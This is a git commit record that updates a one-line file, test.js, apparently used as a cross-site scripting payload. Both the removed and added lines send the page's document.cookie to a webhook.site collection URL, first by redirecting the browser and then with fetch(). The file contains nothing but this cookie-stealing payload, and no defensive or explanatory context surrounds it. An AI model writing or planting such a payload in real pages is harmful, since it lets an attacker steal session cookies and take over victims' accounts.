0450604dd8c3c8985ce6721a803004a3df00e69c
Dimitrios Athanasiadis <93003371+dimitrios-ath@users.noreply.github.com>
2024-07-09 11:07:55 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-window.location='https://webhook.site/f08b808d-66cf-4a35-bb6c-e8d4edaccda4?cookie='+document.cookie
+fetch("https://webhook.site/f08b808d-66cf-4a35-bb6c-e8d4edaccda4?cookie="+document.cookie);
